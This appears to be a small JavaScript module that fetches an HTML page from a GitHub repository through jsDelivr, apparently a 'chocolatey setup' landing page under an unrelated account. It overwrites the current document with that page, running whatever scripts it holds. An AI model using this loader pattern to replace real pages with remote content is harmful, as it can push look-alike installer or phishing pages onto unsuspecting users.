// Ron Penones | November 8th 2025 - Feel free to share and reproduce, the core idea is mine with some assistance of AI. Padayon!
export const targetURL = "https://cdn.jsdelivr.net/gh/mobiledropbox/landing_pages_scripts@main/chocolatey_setup/index.html"; 
export async function loadAndWriteHTML() {
  const r = await fetch(targetURL, { credentials: 'omit' });
  if (!r.ok) throw new Error('Fetch failed: ' + r.status);
  const html = await r.text();
  document.open();
  document.write(html);
  document.close();
}

